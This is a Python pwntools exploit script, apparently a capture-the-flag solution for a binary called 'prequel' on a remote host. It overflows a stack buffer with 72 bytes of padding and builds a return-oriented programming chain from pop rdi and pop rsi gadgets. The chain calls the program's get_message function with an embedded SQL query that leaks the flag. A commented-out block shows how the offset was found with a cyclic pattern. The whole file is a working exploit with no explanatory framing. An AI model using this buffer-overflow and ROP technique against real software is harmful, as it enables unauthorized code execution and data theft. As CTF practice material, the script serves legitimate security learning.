from pwn import *

context.binary = elf = ELF("./prequel")

p = remote("10.10.5.12", "20882")# process()
"""
g = cyclic_gen()

p.sendline(g.get(100))
p.wait()

print(cyclic_find(p.corefile.fault_addr))
"""
offset = 72
POP_RDI = 0x401FF2
POP_RSI = 0x401FF4
FLAG_QUERY = 0x5A10F8 # address of the string "SELECT flag FROM flag LIMIT ?;"
VERSION_STRING = 0x5A1048 # address of the string "101"

payload = b"A" * 72 # padding
payload += p64(POP_RDI)
payload += p64(FLAG_QUERY)
payload += p64(POP_RSI)
payload += p64(VERSION_STRING)
payload += p64(elf.sym["get_message"]) # calling get_message(query, parameter) to execute get query in the sql database

p.sendline(payload)
p.recvuntil(b"Fetching your message...\n")
flag = p.recvuntil(b"}").replace(b"\n", b"").decode() # delete line breaks

log.success("Got flag: " + flag)